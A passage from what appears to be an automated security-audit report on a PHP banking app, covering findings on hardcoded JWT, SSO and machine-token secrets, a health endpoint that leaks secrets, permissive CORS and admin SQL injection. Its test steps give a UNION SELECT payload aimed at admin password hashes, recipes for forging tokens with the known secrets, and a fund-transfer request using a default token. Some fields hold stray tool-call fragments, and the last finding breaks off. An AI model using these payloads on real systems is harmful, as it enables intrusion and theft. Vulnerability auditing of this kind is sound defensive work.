Traced the full source-to-sink path for the admin token, which is the strongest exploitable path: AdminAuthController::login() signs with config['jwt_secret'] via JWT::encode(), and AdminAuthMiddleware::handle() verifies with the identical config['jwt_secret'] via JWT::decode(new Key(...)). If ADMIN_JWT_SECRET is unset in the deployed environment, the literal committed string is the live signing/verification key, and anyone who has read the source (public repo) can forge a valid admin JWT (set iss=BankOfEdAdmin, sub=<admin id>, jti, iat, exp, sign with the known literal) and gain full admin-panel access, bypassing AdminAuthMiddleware.

Checked deployment paths for whether the env vars are actually set at runtime (the flagged proof gap):
- deploy.sh (bash/Apache path): on fresh install it calls generate_secret() (openssl rand) and writes randomized JWT_SECRET and ADMIN_JWT_SECRET into .env — this specifically mitigates the two JWT secrets in that documented path. However it NEVER sets INSURANCE_SSO_SECRET anywhere, so the SSO secret hardcoded default remains live even under deploy.sh.
- Docker path (Dockerfile + docker-entrypoint.sh, the single-container demo build): .env is explicitly excluded via .dockerignore, and neither the Dockerfile ENV directives nor docker-entrypoint.sh set JWT_SECRET, ADMIN_JWT_SECRET, or INSURANCE_SSO_SECRET (only ADMIN_DB_USER is set). Consequently, in the Docker deployment, all three hardcoded literals become the live signing keys for admin JWTs and insurance SSO tokens.

This directly confirms the exploitable path for both the admin JWT secret and the insurance_sso_secret under a documented/shipped deployment method (Docker), satisfying the source (public literal committed to repo) -> sink (JWT::encode/JWT::decode with that literal used for authorization decisions) chain with no blocking control in that path.

One caveat/adjacent finding: for the *customer* JWT (AuthService::createToken / AuthMiddleware), AuthMiddleware::handle() calls AuthService::decodeToken(), which manually base64-decodes the payload and checks only `exp`, never verifying the cryptographic signature at all. This means customer-token forgery does not depend on knowing jwt_secret in the first place (a separate, more severe broken-authentication bug), so the hardcoded 'bankofed-dev-secret' fallback is not the proximate cause of customer account takeover — it's superseded by the missing signature check. This weakens (but does not eliminate) the customer-JWT portion of the candidate's blast-radius claims, while the admin-JWT and insurance-SSO portions remain fully valid and exploitable via the Docker deployment path and (for SSO) via the bash deploy.sh path too.

#### Code evidence

```
// config/app.php
'jwt_secret' => getenv('JWT_SECRET') ?: 'bankofed-dev-secret-change-in-production',
'insurance_sso_secret' => getenv('INSURANCE_SSO_SECRET') ?: 'bankofed-goosecable-sso-shared-secret-key-32b',

// config/admin.php
'jwt_secret' => getenv('ADMIN_JWT_SECRET') ?: 'bankofed-admin-secret-change-in-production',

// src/Services/InsuranceService.php
$secret = $config['insurance_sso_secret'] ?? 'bankofed-goosecable-sso-shared-secret-key-32b';
return JWT::encode($payload, $secret, 'HS256');
```

## 4. CORS misconfiguration: reflected Origin with credentials allowed; cors_origin config is dead code

- Lead reference: PWNJ-004
- Category: A05
- Severity: MEDIUM
- Confidence: 82%
- Validation: dismissed
- Reportable: No
- Location: BankOfEd-main/config/app.php:32 and BankOfEd-main/src/Middleware/CorsMiddleware.php:9-10
- Fingerprint: f9ace0e3c33f223c41b7996a2476e97f77a48fa41c69e50d8e112ba50296f804

### Evidence Chain

#### Source

```
BankOfEd-main/config/app.php:32 and BankOfEd-main/src/Middleware/CorsMiddleware.php:9-10
```

#### Controls encountered

```
[
  "Authentication implemented via manually-attached 'Authorization: Bearer <token>' header (AuthMiddleware/AdminAuthMiddleware/MachineAuthMiddleware regex require the header), not automatically-sent cookies",
  "Token stored in browser localStorage, which is origin-scoped and not accessible to a cross-origin attacker page nor auto-attached by the browser on cross-origin XHR/fetch",
  "No session_start()/setcookie() usage found anywhere in src/, confirming no ambient cookie-based session exists to be ridden via CORS credentials"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "public/banking/js/api.js and public/admin/js/api.js pull the token from localStorage and set it explicitly on the Authorization header in JS, rather than relying on an automatically-sent cookie/credential",
  "grep for session/PHPSESSID/setcookie across src/ returns no results, so there is no cookie-based session for Access-Control-Allow-Credentials to expose"
]
```

#### Proof gaps

```
[
  "Not exhaustively verified whether any other client (e.g., mobile app, third-party integration, insurance SSO flow) relies on cookie-based auth against these same /api/* endpoints, which would restore exploitability",
  "Did not verify whether any browser extension or same-site subdomain scenario could expose the token via a different channel unrelated to this CORS header"
]
```

#### Attack path

Not available for this candidate

#### Validator reasoning

Confirmed the mechanics described in the code: CorsMiddleware.php reflects HTTP_ORIGIN verbatim into Access-Control-Allow-Origin and unconditionally sets Access-Control-Allow-Credentials: true, and 'cors_origin' in config/app.php is indeed dead code (only reference in the entire tree is its own definition — grep confirms no reader). That part of the claim is accurate.

However, the exploitability claim — that this lets an attacker-controlled origin make authenticated cross-origin requests riding the victim's session — does not hold for this application. Grep across src/ shows no session_start()/setcookie()/PHPSESSID usage anywhere; there is no cookie-based session for the browser to automatically attach. All three auth middlewares (AuthMiddleware, AdminAuthMiddleware, MachineAuthMiddleware) require an explicit 'Authorization: Bearer <token>' header, and both front-end clients (public/banking/js/api.js, public/admin/js/api.js) store the JWT in localStorage and manually attach it via JS (`headers['Authorization'] = 'Bearer ' + token`). Per the same-origin policy, a malicious page running on evil.example cannot read the victim's localStorage token (that store is scoped to the bankofed origin) and browsers do not auto-attach Authorization headers cross-origin the way they do cookies. Therefore Access-Control-Allow-Credentials: true (which governs cookies/TLS-client-certs/HTTP auth) has no practical effect here — there is no ambient credential for a cross-origin page to ride on. To actually steal/use the token, an attacker would need a separate primitive (e.g., XSS on the bankofed origin) that would itself already grant full account compromise, independent of the CORS configuration. This matches the human triage's own filter_reasoning, which already concluded the same and downgraded confidence below the actionable threshold before this validation pass.

Net effect: the CORS header configuration is bad practice / defense-in-depth failure (overly permissive, and the intended config knob is unused dead code), but the specific 'exploitable' authenticated cross-origin attack chain described in the finding is defeated by the bearer-token-in-localStorage architecture. This is a hardening gap, not a demonstrable exploit path.

#### Code evidence

```
// config/app.php
'cors_origin' => getenv('CORS_ORIGIN') ?: '*',

// src/Middleware/CorsMiddleware.php (actual enforcement — ignores config)
$origin = $_SERVER['HTTP_ORIGIN'] ?? '*';
header("Access-Control-Allow-Origin: {$origin}");
header('Access-Control-Allow-Credentials: true');
```

## 5. Unauthenticated /api/health endpoint discloses JWT signing secret and DB credentials

- Lead reference: PWNJ-005
- Category: A02
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Router.php:20-33 (route registered at line 87)
- Fingerprint: bd95fd17fd410a71a90e9bcc86e91a863b764be63a4e62b9366c9a95226c1920

### Evidence Chain

#### Source

```
BankOfEd-main/src/Router.php:20-33 (route registered at line 87)
```

#### Controls encountered

```
[
  "[\"None - route registered with 'auth' => false, and Router::dispatch only invokes AuthMiddleware/MachineAuthMiddleware when 'auth' is true or 'machine'; no other gating (IP allowlist, environment check, feature flag) is applied before health() executes and returns secrets.\"]\n<parameter name=\"counterevidence\">[\"None found that disproves the core disclosure. Note: AuthService::decodeToken() in AuthMiddleware does not actually verify the JWT signature (it only base64-decodes and checks exp), which is a separate, independent authentication-bypass defect; it does not negate or diminish the validity of the secrets-disclosure finding itself - the endpoint still discloses jwt_secret and DB credentials to any unauthenticated caller, which remains a real, high-severity information exposure regardless of how AuthMiddleware ultimately validates tokens.\"]"
]
```

#### Sink

Not recorded

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "None material to the core finding. Exploitability of the downstream 'forge arbitrary JWTs to bypass AuthMiddleware' claim is not strictly required to confirm this candidate, since the disclosure of jwt_secret and DB credentials to unauthenticated callers is independently a confirmed high-severity vulnerability; whether or not AuthMiddleware's signature check is itself broken (a separate defect observed in AuthService::decodeToken) is immaterial to confirming this specific candidate."
]
```

#### Attack path

```
{
  "nodes": [
    "External unauthenticated client",
    "GET /api/health (auth=false, registered line 87)",
    "Router::health()",
    "config/app.php load",
    "Response reveals jwt_secret, db_host, db_name, db_user",
    "Attacker signs forged JWT with leaked secret",
    "AuthService::decodeToken/AuthMiddleware accept token for arbitrary sub",
    "Full impersonation of any user across accounts/transactions/profile/insurance SSO"
  ],
  "impact": "Same as PWNJ-001: unauthenticated secret disclosure enabling full authentication bypass and DB reconnaissance.",
  "severity_reasoning": "High: unauthenticated, trivial to exploit, root-of-trust secret exposure enabling total account takeover.",
  "dynamic_test": "curl -s https://target/api/health without auth headers; verify jwt_secret field present; forge and use a JWT against a protected endpoint to confirm bypass."
}
```

#### Validator reasoning

Direct code read confirms the claim exactly. In Router.php, GET /api/health is registered with 'auth' => false (line ~87), and in Router::dispatch(), $requiresAuth === true or === 'machine' triggers AuthMiddleware/MachineAuthMiddleware; any other value (here, false) results in $auth = null and no authentication/authorization check is performed before call_user_func_array($handler, $args) invokes Router::health(). The health() handler loads config/app.php and returns db_host, db_name, db_user, and jwt_secret verbatim in the JSON success response, with no redaction. config/app.php shows jwt_secret defaults to a hardcoded value ('bankofed-dev-secret-change-in-production') when JWT_SECRET env var is unset, and is otherwise directly derived from the env var - either way it is the exact same value used by AuthService::createToken() (config['jwt_secret'], config['jwt_algorithm']) to sign every regular user JWT, confirmed via grep showing AuthService.php line 47 using the identical config key. This is a genuine, unauthenticated, network-reachable sensitive information disclosure (A02: Cryptographic/secrets exposure) with no compensating control - no auth check, no environment gating (only APP_ENV is echoed back, not used to gate the response), no output filtering. An attacker can call GET /api/health with no credentials and receive the JWT signing secret plus DB host/name/user, which (independent of other issues) directly compromises the confidentiality of the credential used to protect all AuthMiddleware-protected endpoints.

#### Code evidence

```
public static function health(): void {
    $config = require __DIR__ . '/../config/app.php';
    Response::success([
        'status'      => 'ok',
        ...
        'db_host'     => $config['db_host'],
        'db_name'     => $config['db_name'],
        'db_user'     => $config['db_user'],
        'jwt_secret'  => $config['jwt_secret'],
        'environment' => getenv('APP_ENV') ?: 'production',
    ]);
}
...
$r->addRoute('GET', '/api/health', ['handler' => [self::class, 'health'], 'auth' => false]);
```

## 6. Hardcoded default machine-to-machine token allows unauthorized fund transfer

- Lead reference: PWNJ-006
- Category: A02
- Severity: HIGH
- Confidence: 93%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/config/app.php:35 and BankOfEd-main/src/Models/MachineToken.php:23-31
- Fingerprint: 5aabfe832899fe5ee1e260ae1504c5a87e11ed6f88a6bb4e7195995fe74ae6c8

### Evidence Chain

#### Source

```
BankOfEd-main/config/app.php:35 and BankOfEd-main/src/Models/MachineToken.php:23-31
```

#### Controls encountered

```
[
  "Balance check requires the source account to have sufficient funds to cover the transfer (limits blast radius but does not prevent unauthorized transfer)",
  "authorization check restricts machine-token-driven transfers to the FACE Insurance merchant account or user #16's account (limits scope but is itself satisfied by the hardcoded-token identity)",
  "Deployers could override MACHINE_TOKEN via environment variable in production, which would invalidate the specific literal value -- but no code enforces this override or warns/fails if it's left at default"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "If a production deployment sets a strong MACHINE_TOKEN env var, the specific hardcoded literal cited would no longer match, reducing real-world exploitability to environments that failed to override the default",
  "The authorization scope in PaymentController::transfer limits the attacker to moving funds only out of the FACE Insurance account or user 16's account, not arbitrary accounts, somewhat narrowing (but not eliminating) impact"
]
```

#### Proof gaps

```
[
  "Actual deployed environment configuration (whether MACHINE_TOKEN is overridden in the real production .env) is unknown from static source review alone; the finding correctly notes source ships with this insecure default regardless"
]
```

#### Attack path

```
{
  "nodes": [
    "External network caller",
    "POST /api/payments/transfer (MachineAuthMiddleware, auth=machine)",
    "MachineToken::validateToken() DB check fails",
    "Unconditional fallback compare vs config['machine_token'] default 'mch_face_insurance_secret_key_2026'",
    "Match -> identity 'configured_machine_token'",
    "PaymentController::transfer authorizes debit from FACE Insurance/user 16 account",
    "Funds moved to attacker-controlled BSB/account"
  ],
  "impact": "Direct unauthorized fund transfer out of the FACE Insurance merchant account using a publicly known default secret, with no legitimate credential required.",
  "severity_reasoning": "High: hardcoded financial-transaction credential leading directly to theft of funds.",
  "dynamic_test": "POST /api/payments/transfer with Authorization: Bearer mch_face_insurance_secret_key_2026 and destination BSB/account attacker controls; observe transaction created and balance debited."
}
```

#### Validator reasoning

Full source-to-sink path verified directly in code:

1. config/app.php:35 defines `'machine_token' => getenv('MACHINE_TOKEN') ?: 'mch_face_insurance_secret_key_2026'` — a hardcoded literal secret shipped in the public repo, used whenever the MACHINE_TOKEN env var is not set (which is the default/likely state for many deployments given other secrets in this file, e.g. jwt_secret and insurance_sso_secret, follow the same insecure pattern of committed fallback defaults).

2. src/Models/MachineToken.php::validateToken() first checks the DB `machine_tokens` table, but if that check fails (empty result), it unconditionally re-loads config/app.php and compares the raw presented token to `$fallbackToken` (the hardcoded literal when env unset). If matched, it returns a fully-privileged machine identity `{'id'=>0, 'name'=>'configured_machine_token', 'is_active'=>1}` without any dependency on the DB state. This fallback executes regardless of whether the machine_tokens table is populated or empty — the code comment claiming it's just for "DB token table empty/unseeded" is misleading; there is no actual guard checking DB emptiness, it's just a straight `if ($rawToken === $fallbackToken)`.

3. src/Router.php routes POST /api/payments/transfer with `'auth' => 'machine'`, which invokes MachineAuthMiddleware::handle(). This middleware extracts a Bearer token from the Authorization header and calls MachineToken::validateToken($token) directly — no additional checks (no IP allowlist, no mTLS, no rate limiting visible).

4. If validateToken returns non-null (including the fallback-matched identity), the middleware returns `['machine' => $machine]` as authenticated context passed to PaymentController::transfer().

5. In PaymentController::transfer() (lines ~186-193), `$machineName = $auth['machine']['name']` is checked against `'face_insurance'` OR `'configured_machine_token'` — and if it matches either, the caller is authorized to transfer funds from the FACE Insurance merchant account (or user #16) to an arbitrary destination BSB/account number, subject only to balance checks. There is no further authentication of the actual client identity beyond the bearer token match.

This gives a concrete, unauthenticated (given knowledge of the hardcoded literal) money-movement path: POST /api/payments/transfer with header `Authorization: Bearer mch_face_insurance_secret_key_2026` and a JSON body specifying the FACE Insurance account's BSB/account number as `from_*` and attacker-controlled `to_*` fields, subject to balance limits (i.e., cannot exceed current account balance) and the account must exist/be active.

No mitigating control was found: the fallback check is not conditioned on the machine_tokens table being empty, there's no separate stricter environment check for production, no additional network-layer authentication for machine routes visible in the reviewed code, and the value is a literal string committed to source control (readable by anyone with source access, and cited directly in the finding as being in a "public source tree").

The only mitigating factors are (a) if the deployer sets MACHINE_TOKEN env var to a strong secret in production this exact literal wouldn't work — but the vulnerability is precisely that the code ships an insecure default and there's no enforcement preventing that default from remaining active, and (b) the blast radius is scoped to the FACE Insurance merchant account / user 16 rather than arbitrary accounts (still a serious unauthorized-fund-transfer issue). Both are accurately reflected as nuances rather than as controls that block exploitability.

#### Code evidence

```
// config/app.php
'machine_token' => getenv('MACHINE_TOKEN') ?: 'mch_face_insurance_secret_key_2026',

// MachineToken.php
$config = require __DIR__ . '/../../config/app.php';
$fallbackToken = $config['machine_token'] ?? 'mch_face_insurance_secret_key_2026';
if ($rawToken === $fallbackToken) {
    return ['id' => 0, 'name' => 'configured_machine_token', 'is_active' => 1];
}

// PaymentController.php
if ($machineName === 'face_insurance' || $machineName === 'configured_machine_token') {
    $merchant = Merchant::findByMerchantId('faceinsurance');
    $allowedAccountId = $merchant ? (int)$merchant['account_id'] : 100;
    ... // authorized to transfer from that account
}
```

## 7. Hardcoded default JWT secrets for admin and user auth enable token forgery

- Lead reference: PWNJ-007
- Category: A02
- Severity: HIGH
- Confidence: 80%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/config/admin.php:21, BankOfEd-main/config/app.php:23
- Fingerprint: 003e9bbb781e175b8fcf05be9e1fb3208aee258d1f5b20a0c270220047166a38

### Evidence Chain

#### Source

```
BankOfEd-main/config/admin.php:21, BankOfEd-main/config/app.php:23
```

#### Controls encountered

```
[
  "Env var override capability exists (ADMIN_JWT_SECRET/JWT_SECRET) allowing operators to set a strong secret",
  "AdminAuthMiddleware checks issuer claim and a revocation table, but neither blocks a freshly-forged token signed with the known default secret"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "Exploitability is conditional on the operator not overriding the env var in production; this cannot be verified from source alone",
  "No live deployment or .env file was found in the repo, so actual runtime secret configuration is unknown"
]
```

#### Proof gaps

```
[
  "Cannot confirm from static source review whether a real production deployment actually left the default secret unset (this is an operational/configuration fact outside the code), though the shipped .env.example reinforces the risk by listing the identical default value"
]
```

#### Attack path

```
{
  "nodes": [
    "Attacker with source access",
    "config/admin.php / config/app.php default jwt_secret fallbacks",
    "Forge JWT: iss=BankOfEdAdmin, sub=<admin id> or user iss, sub=<user id>",
    "AdminAuthMiddleware::handle() / AuthMiddleware verify with same default secret",
    "Grant authenticated admin or customer session with no credentials"
  ],
  "impact": "Unrotated default secrets allow forging valid admin or user JWTs, giving full administrative or customer account access.",
  "severity_reasoning": "Medium-high in practice but reported high due to systemic impact if secrets unrotated; classified per candidate severity as high given admin-level compromise potential.",
  "dynamic_test": "On a test deployment without ADMIN_JWT_SECRET/JWT_SECRET set, craft and sign a JWT with the documented default string and iss=BankOfEdAdmin; submit to an admin API endpoint to verify acceptance."
}
```

#### Validator reasoning

Verified in source: config/admin.php:21 and config/app.php:23 both fall back to hardcoded, publicly-known HS256 JWT secrets ('bankofed-admin-secret-change-in-production' / 'bankofed-dev-secret-change-in-production') whenever ADMIN_JWT_SECRET / JWT_SECRET env vars are unset. Grep confirms these config arrays feed directly into real signing/verification sinks: AdminAuthMiddleware.php:27 calls JWT::decode($token, new Key($config['jwt_secret'], $config['jwt_algorithm'])) to authorize admin requests, AdminAuthController.php:44 signs new admin tokens with the same secret via JWT::encode, and AuthService.php:47 does the equivalent for regular user tokens (consumed by AuthMiddleware). There is no additional secret-strength check, no runtime warning, and no fail-closed behavior if the env var is absent — the fallback string is used silently. Critically, .env.example ships the identical default values for JWT_SECRET and ADMIN_JWT_SECRET, meaning a naive 'cp .env.example .env' deployment (a very common bootstrap pattern) would use the exact same secret string that is now committed to the public source tree. Given knowledge of this secret, an attacker can construct an HS256 JWT with iss=BankOfEdAdmin (or the user equivalent) and an arbitrary sub matching an existing admin_users/users id, sign it with the known default secret, and pass AdminAuthMiddleware's signature check, issuer check, and revocation-table lookup (a freshly forged token has no jti-based revocation and will not be found in admin_revoked_tokens) to gain authenticated admin access with zero credentials. This is a legitimate, concrete source(config)-to-sink(JWT verification) path with no effective blocking control other than an operational assumption that the deployer overrides the env var — an assumption undermined by the fact the shipped .env.example encourages using the same default value. This matches the classic CWE-798 hardcoded credentials / insecure default pattern and is properly classified exploitable for a financial application.

#### Code evidence

```
// config/admin.php
'jwt_secret' => getenv('ADMIN_JWT_SECRET') ?: 'bankofed-admin-secret-change-in-production',
// config/app.php
'jwt_secret' => getenv('JWT_SECRET') ?: 'bankofed-dev-secret-change-in-production',

// AdminAuthMiddleware.php
$payload = JWT::decode($token, new Key($config['jwt_secret'], $config['jwt_algorithm']));
```

## 8. Hardcoded default insurance SSO shared secret enables cross-app token forgery

- Lead reference: PWNJ-008
- Category: A02
- Severity: MEDIUM
- Confidence: 68%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/config/app.php:33
- Fingerprint: 40aaa6f4f99521323ed9df5479dfd7712a6aac0c1b7c30eeb813fbd1077409a0

### Evidence Chain

#### Source

```
BankOfEd-main/config/app.php:33
```

#### Controls encountered

```
[
  "Route requires auth=true to call generateSsoToken via the app's own API, meaning obtaining a *legitimately-generated* token requires being an authenticated BankOfEd user (this limits the 'normal' flow but not the forgery scenario when the raw secret is known)",
  "Token has short 5-minute expiry (exp = now+300), limiting the forged-token replay window",
  "Operators can (and should) set INSURANCE_SSO_SECRET env var, which fully avoids the fallback -- the vulnerable path only fires when that env var is unset in deployment"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "The ultimate impact (full account impersonation on FACE Insurance) is conditional on the external/partner application also trusting this exact default secret; that app's source is not in this repository, so full end-to-end exploitability cannot be verified from this codebase alone",
  "No public/unauthenticated endpoint in this repo directly consumes attacker-forged SSO tokens; the only consumer of the secret within this repo is the signer itself (generateSsoToken), not a verifier, so the risk is chiefly about a weak default credential rather than a directly demonstrable BankOfEd-side authorization bypass"
]
```

#### Proof gaps

```
[
  "Whether the FACE Insurance partner application actually trusts/hardcodes the same default secret cannot be confirmed since its source is not part of this repository",
  "Whether real deployments actually leave INSURANCE_SSO_SECRET unset (making the hardcoded fallback the active secret) is an operational/deployment fact not verifiable from source alone"
]
```

#### Attack path

```
{
  "nodes": [
    "Attacker with source access",
    "config/app.php insurance_sso_secret default fallback 'bankofed-goosecable-sso-shared-secret-key-32b'",
    "Attacker crafts SSO JWT: sub=<victim email>",
    "Sends to FACE Insurance app /sso?token=... endpoint",
    "If partner trusts same default secret, victim impersonated on insurance portal"
  ],
  "impact": "Cross-application identity forgery allowing impersonation of any BankOfEd customer on the linked FACE Insurance portal.",
  "severity_reasoning": "Medium: impact depends on partner app also using default secret, but the shared trust boundary is entirely secret-based and publicly known.",
  "dynamic_test": "On an unrotated deployment, sign a JWT with the default insurance_sso_secret string containing sub=<victim email>, and submit it to the FACE Insurance SSO endpoint to confirm session establishment as that victim."
}
```

#### Validator reasoning

config/app.php:33 defines insurance_sso_secret with a hardcoded fallback ('bankofed-goosecable-sso-shared-secret-key-32b') used when INSURANCE_SSO_SECRET is unset. InsuranceService::generateSsoToken() (src/Services/InsuranceService.php:39) re-applies the identical hardcoded literal as a second fallback (?? operator) even if config somehow lacked the key, and uses it to HS256-sign a JWT asserting the authenticated user's identity ('sub' => email) for SSO into the partner FACE Insurance app. This is reachable via the authenticated route GET /api/insurance/sso (Router.php:83 -> InsuranceController::ssoUrl -> InsuranceService::getSsoUrl -> generateSsoToken), confirming a real source-to-sink path: hardcoded secret literal -> JWT::encode sink used for cross-system identity assertion. If the deployment does not set INSURANCE_SSO_SECRET (plausible default/misconfiguration scenario, especially since this is the pattern seen for jwt_secret, machine_token as well in the same file), the same publicly-visible-in-source value signs assertions, and anyone with source access (or who guesses/finds it, since it's now disclosed) could forge a valid signature for arbitrary 'sub' emails without needing app-level auth bypass, if they can present that JWT to whichever endpoint/mechanism trusts it. This is a legitimate default-secret / hardcoded-credential weakness on the BankOfEd side, which is what is unconditionally verifiable in this repo.

#### Code evidence

```
'insurance_sso_secret' => getenv('INSURANCE_SSO_SECRET') ?: 'bankofed-goosecable-sso-shared-secret-key-32b',
...
$secret = $config['insurance_sso_secret'] ?? 'bankofed-goosecable-sso-shared-secret-key-32b';
return JWT::encode($payload, $secret, 'HS256');
```

## 9. CORS middleware reflects arbitrary Origin with credentials enabled, ignoring configured cors_origin

- Lead reference: PWNJ-009
- Category: A05
- Severity: HIGH
- Confidence: 70%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Middleware/CorsMiddleware.php:8-11
- Fingerprint: 12e0121be7d13135ea4b5bdeee955243a9217cc35f9e37f25070e521075146b1

### Evidence Chain

#### Source

```
BankOfEd-main/src/Middleware/CorsMiddleware.php:8-11
```

#### Controls encountered

```
[
  "None found: config/app.php's cors_origin allow-list is defined but never consulted by CorsMiddleware or anywhere else (confirmed via repo-wide grep) so it provides no protection.",
  "No conditional/allow-list logic gates the header emission in CorsMiddleware::handle(); it runs unconditionally for every /api/* request."
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "The application does not use cookie- or session-based authentication anywhere in the codebase (no session_start/$_SESSION/setcookie found); both banking and admin frontends store bearer JWTs in localStorage and attach them manually via Authorization headers on same-origin requests only.",
  "Browsers do not automatically attach an Authorization header to cross-origin fetch/XHR requests, and localStorage is not readable across origins, so the specific 'victim's authenticated cookie/session is auto-forwarded by the browser to the attacker's cross-site request' exploitation path described in the finding does not directly apply to this app's current stateless bearer-token design without an additional vulnerability (e.g., XSS) to exfiltrate the token."
]
```

#### Proof gaps

```
[
  "No PoC/HTTP trace was executed against a live instance; the reachability and header behavior were confirmed purely via static code and control-flow review of CorsMiddleware.php and public/index.php.",
  "Full account-takeover impact requires chaining with a separate primitive (e.g., XSS or future cookie-based auth) since the current architecture uses localStorage-stored bearer tokens rather than cookies; this reduces the finding to a confirmed CORS/header misconfiguration rather than a demonstrated standalone full data-exfiltration/CSRF chain."
]
```

#### Attack path

```
{
  "nodes": [
    "Attacker-controlled website visited by victim",
    "Victim's browser holds bearer token/cookie for BankOfEd session",
    "Malicious page issues fetch/XHR with credentials to BankOfEd API",
    "CorsMiddleware::handle() reflects request Origin header into Access-Control-Allow-Origin and sets Access-Control-Allow-Credentials: true",
    "Browser permits cross-origin credentialed request/response read",
    "Attacker exfiltrates victim's account/transaction/profile data or triggers state-changing calls"
  ],
  "impact": "Reflected-origin CORS with credentials enabled defeats same-origin policy, letting any external site read authenticated API responses or perform actions as the logged-in victim (data exfiltration, CSRF-like state changes).",
  "severity_reasoning": "High: undermines the browser security boundary for an entire authenticated financial API surface with no user interaction beyond visiting a malicious page.",
  "dynamic_test": "From a page hosted on a different origin, issue fetch('https://target/api/profile', {credentials:'include'}) with an attacker Origin header set; confirm the response includes Access-Control-Allow-Origin: <attacker origin> and Access-Control-Allow-Credentials: true, and that the JSON body is readable cross-origin."
}
```

#### Validator reasoning

Code review confirms the core claim exactly as described. In BankOfEd-main/src/Middleware/CorsMiddleware.php::handle() the Origin request header is reflected verbatim into Access-Control-Allow-Origin ($origin = $_SERVER['HTTP_ORIGIN'] ?? '*'; header("Access-Control-Allow-Origin: {$origin}");) with no allow-list check, and Access-Control-Allow-Credentials: true and Access-Control-Allow-Headers: * are set unconditionally on every response. This handler is invoked unconditionally for every /api/* request from public/index.php (CorsMiddleware::handle();) before routing, so the flawed header logic is reachable on all API traffic without any gating. A grep across the repo confirms config/app.php's 'cors_origin' setting (the intended allow-list) is defined but never read anywhere outside that one config line — it is genuinely dead code, so there is no effective control limiting the reflected origin. This is a textbook CWE-942 "Permissive Cross-domain Policy with Untrusted Domains" combined with Allow-Credentials:true, and the source (attacker-controlled Origin header) to sink (response header controlling browser CORS enforcement) path is direct and trivially reproducible with a single crafted HTTP request (e.g., curl -H "Origin: https://evil.example").

One nuance affects the severity/impact narrative rather than the existence of the flaw: I verified that BankOfEd does not use cookie- or PHP-session-based authentication anywhere (no session_start/$_SESSION/setcookie in the codebase). Both the banking and admin front-ends (public/banking/js/api.js, public/admin/js/api.js) store bearer JWTs in localStorage and attach them manually via the Authorization header on same-origin JS calls; AuthMiddleware/AdminAuthMiddleware only read Authorization headers, never cookies. Because localStorage is not accessible cross-origin and browsers do not auto-attach an Authorization header to cross-site requests, the specific "victim's browser auto-attaches credentials to attacker's cross-origin fetch" account-takeover scenario described in the write-up is not directly achievable purely via this CORS misconfiguration under the app's current stateless-bearer-token architecture — it would require an additional primitive (e.g., XSS to read the token) to become a full account-compromise chain. The misconfiguration itself, however, is real, unconditionally reachable, and remains a legitimate high-value defect (any future/incidental cookie-based mechanism, same-site subdomains, or any endpoint relying on implicit browser trust would be immediately exploitable), so I am confirming the CORS-misconfiguration finding while noting the overstated cookie/session hijack narrative as a caveat rather than a defeat of the core vulnerability.

#### Code evidence

```
// config/app.php
'cors_origin' => getenv('CORS_ORIGIN') ?: '*',   // never read elsewhere

// CorsMiddleware.php
$origin = $_SERVER['HTTP_ORIGIN'] ?? '*';
header("Access-Control-Allow-Origin: {$origin}");
header('Access-Control-Allow-Credentials: true');
```

## 10. SQL Injection via unsanitized 'search' GET parameter in Admin customer listing

- Lead reference: PWNJ-010
- Category: A03
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/AdminUserController.php:20-32
- Fingerprint: 5903b7e9e482801222865c86bc3a1982531eeca3fe8ffd44da4a8966055176a8

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/AdminUserController.php",
  "line": 18,
  "symbol": "$_GET['search']",
  "input": "HTTP GET query parameter 'search'"
}
```

#### Controls encountered

```
[
  "[\"Endpoint requires 'auth' => true, enforced via AdminAuthMiddleware::handle() before the controller runs, restricting reachability to holders of a valid admin JWT — this is an authorization gate, not an input-sanitization control, and does not prevent injection by an authenticated caller.\"]\n<parameter name=\"counterevidence\">[\"PDO::ATTR_EMULATE_PREPARES is set to false on the connection, but this only hardens genuine prepare()/execute() parameter binding elsewhere in the file (show/update/resetPassword/destroy) and has no bearing on the raw $db->query() calls used in index(), so it does not mitigate this specific vulnerability.\"]"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/AdminUserController.php",
  "line": 28,
  "symbol": "$db->query($countSql)",
  "operation": "raw SQL execution with interpolated user input"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Exact runtime DB error-reporting/verbosity (which would affect ease of error-based exfiltration) was not verified, though boolean-based/UNION-based blind injection remains viable regardless.",
  "Did not verify whether any WAF/reverse proxy in front of the admin panel filters typical SQLi payloads, though this is an application-layer control gap independent of network-layer mitigations."
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated admin (or actor reaching AdminUserController::index)",
    "GET /api/admin/customers?search=<payload>",
    "AdminUserController::index() reads $_GET['search']",
    "Raw string interpolation into SQL WHERE clause",
    "$db->query($countSql)/$db->query($sql) executes unsanitized SQL",
    "Arbitrary data exfiltration (admin_users, users, accounts tables) or blind boolean/time-based extraction"
  ],
  "impact": "SQL injection in admin customer search allows exfiltration of arbitrary database content including admin_users password hashes and full customer PII, or database manipulation.",
  "severity_reasoning": "High: classic unparameterized SQL injection reachable via admin API, with full DB read/exfiltration potential including credential hashes.",
  "dynamic_test": "Send GET /api/admin/customers?search=%25%27%20UNION%20SELECT%20username,password_hash,3,4,5,6,7%20FROM%20admin_users--%20- with a valid admin session and observe injected UNION data returned in the response, confirming SQLi."
}
```

#### Validator reasoning

